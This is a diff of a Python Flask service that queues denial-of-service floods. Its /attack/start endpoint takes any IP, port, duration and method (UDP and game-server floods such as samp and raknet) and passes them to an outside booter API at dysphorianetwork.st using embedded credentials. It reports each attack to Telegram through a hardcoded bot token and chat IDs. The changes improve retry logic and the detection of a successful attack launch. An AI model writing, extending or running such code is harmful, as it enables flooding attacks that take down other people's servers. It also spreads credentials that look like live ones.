@@ -13,12 +13,10 @@ logger = logging.getLogger(__name__)
 
 # Telegram Bot Configuration
 BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
-
 CHAT_IDS = [
     "8523310365",
     "7646520243"
 ]
-
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
 def send_telegram_message(message):
@@ -35,17 +33,14 @@ def send_telegram_message(message):
             except:
                 pass
 
-
-# ==================== NEW TARGET APIS ====================
+# ==================== TARGET APIS ====================
 TARGET_APIS = [
-    {"id": 6, "name": "API_6", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
-    {"id": 7, "name": "API_7", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
-    {"id": 8, "name": "API_8", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
-    {"id": 9, "name": "API_9", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
-    {"id": 10, "name": "API_10", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
+    {"id": 1, "name": "API_1", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
+    {"id": 2, "name": "API_2", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
+    {"id": 3, "name": "API_3", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
+    {"id": 4, "name": "API_4", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
+    {"id": 5, "name": "API_5", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "last_used": None, "current_attack": None},
 ]
-# ======================================================
-
 
 def get_response_summary(response, response_time):
     summary = f"Status: {response.status_code} | Time: {response_time}ms\n"
@@ -59,42 +54,74 @@ def get_response_summary(response, response_time):
         summary += f"Response: {text}"
     return summary
 
-
 def is_attack_successful(response):
+    """
+    Optimized for dysphorianetwork.st API
+    Handles: {"error": false, "message": "attack launched"}
+    and     {"error": true, "message": "Slots full (5/5)..."}
+    """
+    if not response:
+        return False
+
     try:
         data = response.json()
-        if data.get('success') is True or data.get('error') is False:
+        
+        error = data.get('error')
+        message = str(data.get('message', '')).lower()
+
+        # Direct checks (Best for your API)
+        if error is False:
             return True
-        msg = str(data.get('message', '')).lower()
-        if any(word in msg for word in ['launched', 'started', 'success', 'ok', 'sent', 'attack']):
+        if error is True:
+            return False
+
+        # Keyword fallback
+        success_keywords = ['launched', 'started', 'success', 'sent', 'attack', 'flood']
+        error_keywords = ['slots full', 'busy', 'full', 'wait', 'error', 'fail', 'denied', 'limit', 'cooldown']
+
+        if any(word in message for word in success_keywords):
             return True
-    except:
+        if any(word in message for word in error_keywords):
+            return False
+
+    except (ValueError, TypeError, AttributeError, KeyError):
         pass
 
+    # Fallback for non-JSON or other cases
     if response.status_code == 200:
-        text = response.text.lower()
-        if not any(word in text for word in ['error', 'fail', 'invalid', 'busy']):
+        text = response.text.strip().lower()
+        if not text:
             return True
+        if any(word in text for word in ['slots full', 'busy', 'wait', 'full']):
+            return False
+        if any(word in text for word in ['launched', 'started', 'success']):
+            return True
+        return True  # Default for 200 OK
+
+    if response.status_code >= 400:
+        return False
+
     return False
 
-
 def send_attack(api, ip, port, duration, method):
+    """Send attack with improved retry logic"""
     target_url = api['url'].format(method=method, ip=ip, port=port, time=duration)
-    
+   
     max_retries = 8
     retry_count = 0
-    
+   
     while retry_count < max_retries:
+        attempt = retry_count + 1
         start_time = time.time()
-        
+       
         try:
-            response = requests.get(target_url, timeout=15)
+            response = requests.get(target_url, timeout=20)   # Increased timeout
             response_time = int((time.time() - start_time) * 1000)
-            
+           
             response_summary = get_response_summary(response, response_time)
-            
+           
             telegram_msg = f"""
-🔵 <b>ATTACK REQUEST #{retry_count+1}</b>
+🔵 <b>ATTACK REQUEST #{attempt}/{max_retries}</b>
 ├ API: {api['name']}
 ├ Method: {method.upper()}
 ├ Target: {ip}:{port}
@@ -105,7 +132,7 @@ def send_attack(api, ip, port, duration, method):
 {response_summary}
 """
             send_telegram_message(telegram_msg)
-            
+           
             if is_attack_successful(response):
                 send_telegram_message(f"""
 ✅ <b>ATTACK SUCCESSFULLY STARTED</b>
@@ -114,6 +141,7 @@ def send_attack(api, ip, port, duration, method):
 ├ Target: {ip}:{port}
 ├ Duration: {duration}s
 ├ Response Time: {response_time}ms
+├ Attempt: {attempt}/{max_retries}
 """)
                 time.sleep(duration)
                 send_telegram_message(f"""
@@ -123,16 +151,17 @@ def send_attack(api, ip, port, duration, method):
 ├ Duration: {duration}s
 """)
                 return {'success': True}
-            
+           
             else:
                 retry_count += 1
-                time.sleep(2)
-                
+                if retry_count < max_retries:
+                    time.sleep(2)
+               
         except Exception as e:
             retry_count += 1
             response_time = int((time.time() - start_time) * 1000)
             send_telegram_message(f"""
-⚠️ <b>REQUEST FAILED</b> (Attempt {retry_count}/{max_retries})
+⚠️ <b>REQUEST FAILED</b> (Attempt {attempt}/{max_retries})
 ├ API: {api['name']}
 ├ Method: {method.upper()}
 ├ Target: {ip}:{port}
@@ -140,20 +169,21 @@ def send_attack(api, ip, port, duration, method):
 ├ Time: {response_time}ms
 """)
             if retry_count < max_retries:
-                time.sleep(2)
-    
+                time.sleep(min(2 ** retry_count, 10))  # Exponential backoff
+
+    # All retries failed
     send_telegram_message(f"""
 💀 <b>ALL RETRIES FAILED</b> on {api['name']}
 ├ Method: {method.upper()}
 ├ Target: {ip}:{port}
+├ Attempts: {max_retries}
 """)
     return {'success': False}
-
 
 def execute_attack(api, ip, port, total_time, method):
     api['busy'] = True
     api['current_attack'] = {'ip': ip, 'port': port, 'time': total_time, 'method': method}
-    
+   
     send_telegram_message(f"""
 🚀 <b>NEW ATTACK QUEUED</b>
 ├ API: {api['name']}
@@ -161,50 +191,48 @@ def execute_attack(api, ip, port, total_time, method):
 ├ Target: {ip}:{port}
 ├ Time: {total_time}s
 """)
-    
+   
     result = send_attack(api, ip, port, total_time, method)
-    
+   
     api['busy'] = False
     api['current_attack'] = None
-    
+   
     status = "✅ SUCCESS" if result['success'] else "💀 FAILED"
     send_telegram_message(f"{status} | {api['name']} → {method.upper()} {ip}:{port} ({total_time}s)")
-
 
 @app.route('/attack/start', methods=['GET'])
 def start_attack():
     ip = request.args.get('ip')
     port = request.args.get('port')
     time_param = request.args.get('time')
-    method = request.args.get('method', 'samp')   # Default to UDP if not provided
-    
+    method = request.args.get('method', 'samp')
+
     if not all([ip, port, time_param]):
         return jsonify({'error': 'Missing ip, port, or time'}), 400
-    
+
     try:
         port = int(port)
         total_time = int(time_param)
-        if total_time <= 0:
+        if total_time <= 0 or total_time > 3600:
             raise ValueError
     except ValueError:
         return jsonify({'error': 'Invalid parameters'}), 400
-    
-    # Validate method
-    allowed_methods = ['udp-big', 'udp-pps', 'samp', 'raknet',]
+
+    allowed_methods = ['udp-big', 'udp-pps', 'samp', 'raknet']
     if method.lower() not in allowed_methods:
         return jsonify({'error': f'Invalid method. Allowed: {allowed_methods}'}), 400
-    
+
     selected_api = next((api for api in TARGET_APIS if not api['busy']), None)
-    
+   
     if not selected_api:
         return jsonify({'error': 'All APIs are busy'}), 503
-    
+
     threading.Thread(
         target=execute_attack,
         args=(selected_api, ip, port, total_time, method.lower()),
         daemon=True
     ).start()
-    
+   
     return jsonify({
         'success': True,
         'api': selected_api['name'],
@@ -213,14 +241,12 @@ def start_attack():
         'time': total_time
     })
 
-
 @app.route('/status', methods=['GET'])
 def status():
     return jsonify({
         'free': [api['name'] for api in TARGET_APIS if not api['busy']],
         'busy': [api['name'] for api in TARGET_APIS if api['busy']]
     })
-
 
 if __name__ == '__main__':
     print("="*70)
